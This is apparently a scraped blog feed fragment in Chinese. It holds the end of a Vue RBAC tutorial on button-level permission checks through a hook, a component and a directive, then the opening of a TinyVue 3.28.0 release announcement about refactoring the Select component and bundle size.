<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7a0651ef4e04079ad768e61348f4f9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=jdp3ukrt2whwnNycuH6XyGg7mEI%3D" alt="image.png" loading="lazy"/></p>
<p>当然，不是说不遵守这个格式就不行，但我推荐这种格式。可以让我们在代码里更清楚地理解权限码含义，也方便后续维护</p>
<p>还要考虑一种情况：某个角色不管系统有多少权限都可以访问，比如超级管理员 <code>superAdmin</code>，对于这样的角色，我们做点特殊处理，比如用通配符 <code>*</code> 表示全部权限（如 <code>*:*:*</code>）。这时无需再做权限筛选，直接放行即可</p>
<h2 data-id="heading-3">按钮级权限实战</h2>
<p>在操作级权限设计中，在 Vue 框架下，有三种实现按钮级权限的方式：<strong>组件式、自定义指令、函数式</strong></p>
<ol>
<li><strong>组件式</strong>：编写 Vue 组件，插槽内容由权限码属性决定是否渲染</li>
<li><strong>自定义指令</strong>：通过指令控制 DOM 来实现元素显隐</li>
<li><strong>函数式</strong>：在函数中写权限筛选逻辑，上面两种方式都会依赖它</li>
</ol>
<h3 data-id="heading-4">函数式</h3>
<p>函数式写法最常见，把权限判断封装成工具函数或 <code>hook</code> 都可以。先看一个实现：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/modules/user'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PermissionCode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'#/type'</span>;
<span class="hljs-keyword">import</span> { storeToRefs } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>;
<span class="hljs-keyword">import</span> { isEmpty } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useAuth</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>();
  <span class="hljs-keyword">const</span> { getPermissionCodes } = <span class="hljs-title function_">storeToRefs</span>(userStore);

  <span class="hljs-comment">//...</span>

  <span class="hljs-comment">/**
   * 判断是否有权限
   * <span class="hljs-doctag">@param</span> code 权限码，可以是单个权限码字符串，也可以是权限码数组
   * <span class="hljs-doctag">@returns</span> 是否有权限
   */</span>
  <span class="hljs-keyword">const</span> hasPermission = (<span class="hljs-attr">code</span>: <span class="hljs-title class_">PermissionCode</span>): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
    <span class="hljs-comment">// 如果是特殊通配符，直接放行</span>
    <span class="hljs-keyword">if</span> (getPermissionCodes.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'*:*:*'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// 空字符串、空数组情况，默认为无权限</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isEmpty</span>(code)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">const</span> codes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(code) ? code : [code];

    <span class="hljs-comment">// 只要满足其中一个权限码即可</span>
    <span class="hljs-keyword">return</span> codes.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> getPermissionCodes.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(c));
  };

  <span class="hljs-keyword">return</span> {
    hasPermission,
  };
};

</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">use-auth.ts</a> 找到实战代码</p>
</blockquote>
<p>这里我把逻辑写成一个 <code>hook</code>，重点关注 <code>hasPermission</code> 方法。它接收权限码参数 <code>code</code>，返回一个布尔值，表示是否有权限</p>
<p><code>getPermissionCodes</code> 表示当前用户拥有的权限码</p>
<p><code>code</code> 参数既可以是单个字符串，也可以是数组。因为用户可以同时拥有多个权限码（如 <code>user:add</code>、<code>user:edit</code>），所以类型定义如下：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * 权限码类型
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">PermissionCode</span>&lt;T = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">string</span>[]&gt; = T;

</code></pre>
<p>实际场景中，可配合 <code>v-if</code> 来控制元素显隐：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6222f0f25d08414c9eb61c158a51d084~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=Fi9bgDT%2FG9ZrNR1O0hARXd3PLY4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">组件式</h3>
<p>组件式很好理解：把“权限判断”封装成 Vue 组件，内部内容由权限码决定是否渲染。</p>
<p>这里用 <code>AppAuth</code> 组件示例：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { PermissionCode } from '@/types/common';
import { computed } from 'vue';
import { useAuth } from '@/hooks/useAuth';

defineOptions({
  name: 'AppAuth',
});

export interface AppAuthProps {
  /**
   * 权限码
   */
  codes: PermissionCode;
}

const props = withDefaults(defineProps&lt;AppAuthProps&gt;(), {
  codes: '',
});

const { hasPermission } = useAuth();

/**
 * 是否有权限
 */
const hasAuth = computed(() =&gt; {
  return hasPermission(props.codes);
});
&lt;/script&gt;

&lt;template&gt;
  &lt;slot v-if="hasAuth" /&gt;
  &lt;slot v-else name="no-auth" /&gt;
&lt;/template&gt;
</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">app-auth.vue</a> 找到代码实现</p>
</blockquote>
<p>在频繁使用的场景下，最好全局注册该组件：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AppAuth</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/AppAuth.vue'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

<span class="hljs-comment">// 全局注册</span>
app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'AppAuth'</span>, <span class="hljs-title class_">AppAuth</span>)

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)

</code></pre>
<p>全局注册组件时要补上 <code>TypeScript</code> 的类型提示，我在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Ftypings%2Fapp-components.d.ts%23L9" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/typings/app-components.d.ts#L9" ref="nofollow noopener noreferrer"><code>src/typings/app-components.d.ts</code></a> 中添加了类型声明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> {};

<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'vue'</span> {
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalComponents</span> {
    <span class="hljs-comment">//...</span>
    <span class="hljs-title class_">AppAuth</span>: (<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../components/common/app-auth/index'</span>))[<span class="hljs-string">'AppAuth'</span>];
  }
}

</code></pre>
<p>然后就可以直接使用 <code>AppAuth</code> 组件了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91a88cccac5f462a8993066e9114bcf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=L6twJfpSYJV8zeL5vqKugwLYoVU%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>当用户没有权限时，会渲染 <code>no-auth</code> 插槽的内容，可以在 <code>no-auth</code> 插槽中自定义展示内容。</p>
</blockquote>
<h3 data-id="heading-6">自定义指令</h3>
<p>自定义指令也是一种很方便的实现方式，通过操作 <code>DOM</code> 来实现元素显隐</p>
<p>通过 <code>app.directive</code> 方法来注册 <code>v-auth</code></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// directives/auth.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Directive</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">PermissionCode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types'</span>;
<span class="hljs-keyword">import</span> { useAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useAuth'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">AuthDirective</span> = <span class="hljs-title class_">Directive</span>&lt;<span class="hljs-title class_">HTMLElement</span>, <span class="hljs-title class_">PermissionCode</span>&gt;;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">authDirective</span>: <span class="hljs-title class_">AuthDirective</span> = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { hasPermission } = <span class="hljs-title function_">useAuth</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasPermission</span>(binding.<span class="hljs-property">value</span>)) {
      el.<span class="hljs-title function_">remove</span>();
    }
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { hasPermission } = <span class="hljs-title function_">useAuth</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasPermission</span>(binding.<span class="hljs-property">value</span>)) {
      el.<span class="hljs-title function_">remove</span>();
    }
  },
};

</code></pre>
<blockquote>
<p>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Fdirectives%2Fmodules%2Fauth.ts" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/directives/modules/auth.ts" ref="nofollow noopener noreferrer">directives/modules/auth.ts</a> 找到代码实现</p>
</blockquote>
<p>然后在 <code>main.ts</code> 中注册 <code>v-auth</code> 指令：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> { authDirective } <span class="hljs-keyword">from</span> <span class="hljs-string">'./directives/auth'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'auth'</span>, authDirective);
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>同样要补上全局指令的类型定义，在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin%2Fblob%2Fmain%2Fsrc%2Ftypings%2Fdirective.d.ts" target="_blank" title="https://github.com/bryqiu/vue-clean-admin/blob/main/src/typings/directive.d.ts" ref="nofollow noopener noreferrer"><code>src/typings/directive.d.ts</code></a> 中添加类型声明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">AuthDirective</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/directives/typing'</span>;

<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'vue'</span> {
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalDirectives</span> {
    <span class="hljs-attr">vAuth</span>: <span class="hljs-title class_">AuthDirective</span>;
  }
}

</code></pre>
<p>然后就可以使用 <code>v-auth</code> 指令来实现权限控制：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f37e57da0e647d68d018714913e87fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=oqRtAn1bdfKqvGBdDnrdUE%2Fi4cE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">菜单管理、角色管理</h2>
<p>在权限实战第二篇：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F18" target="_blank" title="https://github.com/bryqiu/Blog/issues/18" ref="nofollow noopener noreferrer">RBAC 权限系统实战（二）：权限信息管理的设计</a> 中，实现了菜单、角色管理的基本管理操作，比如菜单 CRUD、角色绑定权限等操作</p>
<p>从细粒度来看，我们现在多做了一层操作级权限，关于这两个模块，要进行一点小改动</p>
<p>在菜单管理中，新增、编辑菜单等操作中，新加一个”操作“的类型，以支持添加操作级权限信息</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cecf244332934f43873d1051edae7367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=1mknhEdpbHBMNRnbXgY3evYrtxo%3D" alt="image.png" loading="lazy"/></p>
<p>注意这里要填写的表单信息，是根据菜单类型来展示不同的字段，比如“操作”类型，需要填写权限码</p>
<p>然后，菜单列表的数据是这样的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/186c503a10754239b61b09a4c804f7e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=iAXUDeTsqpttnN83FYRoefEjpds%3D" alt="image.png" loading="lazy"/></p>
<p>在角色管理模块中，主要关注”分配权限“的操作，允许给角色分配操作级权限</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca354be394294ec2998b84e3cf5b8895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=vCZds%2BjUt06C6y42Zl6eJ3cSfM0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">了解更多</h2>
<p>系列专栏地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%3Ftab%3Dreadme-ov-file%23%25E9%2580%259A%25E4%25BF%2597%25E6%2598%2593%25E6%2587%2582%25E7%259A%2584%25E4%25B8%25AD%25E5%2590%258E%25E5%258F%25B0%25E7%25B3%25BB%25E7%25BB%259F%25E5%25BB%25BA%25E8%25AE%25BE%25E6%258C%2587%25E5%258D%2597%25E4%25B8%2593%25E6%25A0%258F" target="_blank" title="https://github.com/bryqiu/Blog?tab=readme-ov-file#%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E4%B8%AD%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E5%BB%BA%E8%AE%BE%E6%8C%87%E5%8D%97%E4%B8%93%E6%A0%8F" ref="nofollow noopener noreferrer">GitHub 博客</a> | <a href="https://juejin.cn/column/7437267529330901026" target="_blank" title="https://juejin.cn/column/7437267529330901026">掘金专栏</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fsegmentfault.com%2Fblog%2Fadmin_guide" target="_blank" title="https://segmentfault.com/blog/admin_guide" ref="nofollow noopener noreferrer">思否专栏</a></p>
<p>实战项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2Fvue-clean-admin" target="_blank" title="https://github.com/bryqiu/vue-clean-admin" ref="nofollow noopener noreferrer">vue-clean-admin</a></p>
<h2 data-id="heading-9">交流讨论</h2>
<p>文章如有错误或需要改进之处，欢迎指正。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TinyVue 3.28.0 正式发布：稳定性大幅提升！]]></title>    <link>https://juejin.cn/post/7602135278666022964</link>    <guid>https://juejin.cn/post/7602135278666022964</guid>    <pubDate>2026-02-03T06:17:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278666022964" data-draft-id="7602259669730230299" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TinyVue 3.28.0 正式发布：稳定性大幅提升！"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T06:17:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTiny社区"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TinyVue 3.28.0 正式发布：稳定性大幅提升！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTiny社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:21.000Z" title="Tue Feb 03 2026 06:17:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文由体验技术团队TinyVue项目组原创。</p>
<h2 data-id="heading-0">一、前言</h2>
<p>我们非常高兴地宣布，最近，TinyVue发布了 v3.28.0🎉,
这个版本带来了：</p>
<ul>
<li><strong>选择器组件家族全面重构</strong> - 统一架构，性能提升</li>
<li><strong>主题动画全局配置</strong>- 一键定制，随心所欲</li>
<li><strong>65+Bug 及优化修复</strong> - 稳定性大幅提升</li>
</ul>
<p>详细的 Release Notes 请参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Freleases%2Ftag%2Fv3.28.0" target="_blank" title="https://github.com/opentiny/tiny-vue/releases/tag/v3.28.0" ref="nofollow noopener noreferrer">github.com/opentiny/ti…</a></p>
<p>本次版本共有 11 位贡献者参与开发，其中 IKEYCY / neostfox 是新朋友，欢迎新朋友的加入👏，感谢新老朋友们对 TinyVue 的辛苦付出👏</p>
<ul>
<li>IKEYCY- 新增贡献者✨</li>
<li>neostfox- 新增贡献者✨</li>
<li>shenjunjian</li>
<li>kagol</li>
<li>zzcr</li>
<li>gimmyhehe</li>
<li>Davont</li>
<li>discreted66</li>
<li>wuyiping0628</li>
<li>James-9696</li>
<li>gausszhou</li>
</ul>
<p>同时，如果你在使用过程中遇到任何问题，或者有好的建议，欢迎：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Fissues" target="_blank" title="https://github.com/opentiny/tiny-vue/issues" ref="nofollow noopener noreferrer">提交 Issue</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue%2Fdiscussions" target="_blank" title="https://github.com/opentiny/tiny-vue/discussions" ref="nofollow noopener noreferrer">加入讨论</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design%2Ftiny-vue" target="_blank" title="https://opentiny.design/tiny-vue" ref="nofollow noopener noreferrer">查看文档</a></li>
</ul>
<h2 data-id="heading-1">二、升级指南</h2>
<p>你可以更新 @opentiny/vue@3.28.0 进行体验！</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装最新版本</span>

npm install @opentiny/vue@3.28.0

<span class="hljs-comment"># 或使用 yarn</span>

yarn add @opentiny/vue@3.28.0
</code></pre>
<p>如果遇到问题，可以：</p>
<p><strong>查看 Issue</strong> - 在 GitHub 上搜索相关问题
<strong>提交 Issue</strong> - 如果问题未解决，提交新的 Issue</p>
<h2 data-id="heading-2">三、特性介绍</h2>
<p>下面我们一起来看看都有哪些更新吧！</p>
<h3 data-id="heading-3">选择器组件"家族重组"</h3>
<h4 data-id="heading-4">为什么需要重构？</h4>
<p>Select 组件的现状和问题：</p>
<ul>
<li>Select 组件中耦合了 Tree / Grid 两个重型组件，分别对应下拉树和下拉表格两个特性，render-type="tree" | "grid"</li>
<li>下拉树和下拉表格并不是常态，普通的下拉列表才是常态，这就导致了大量只使用Select简单功能的业务包体积也很大，影响业务性能</li>
<li>依赖了 Select 的组件，比如 Area，间接地等于依赖了 Select / Grid / Tree，导致包体积变大</li>
<li>本来应该依赖基于 Select 组件的组件，比如 Pager，由于 Select 耦合了 tree/grid，因此只能自己实现一个 Select，造成重复代码</li>
</ul>
<p>我们使用 Vite 创建一个空的 Vue 项目，对比下不同情况下构建产物体积情况：</p>








































<table><thead><tr><th/><th>产物体积(css+js, 单位kB)</th><th>gzip之后的产物体积(单位kB)</th></tr></thead><tbody><tr><td>不引入TinyVue组件</td><td>56</td><td>23</td></tr><tr><td>只引入Select组件</td><td>1777</td><td>424</td></tr><tr><td>只引入Tree组件</td><td>789</td><td>190</td></tr><tr><td>只引入Grid组件</td><td>1217</td><td>302</td></tr><tr><td>只引入Button</td><td>310</td><td>91</td></tr><tr><td>只引入Area组件(依赖Select)</td><td>1783</td><td>425</td></tr></tbody></table>
<p>不引入TinyVue组件/只引入Select组件/只引入Tree组件的产物体积对比：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74910485864c44c5a1c6d8a8a6242861~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=C0TDLyuX7rjjULUNH7bjS8pDyf4%3D" alt="1.png" loading="lazy"/></p>
<p>只使用 Area 组件（依赖了Select组件）的产物体积：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/326c0bc716f841e49becc48aad78d46d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=NhguJRaC%2BgogrIlK9u3uhfr2MxU%3D" alt="2.png" loading="lazy"/>
可以看到：</p>
<ul>
<li>只引入 Select 组件，产物里面却同时包含了 tree/grid 两个组件，导致产物体积很大</li>
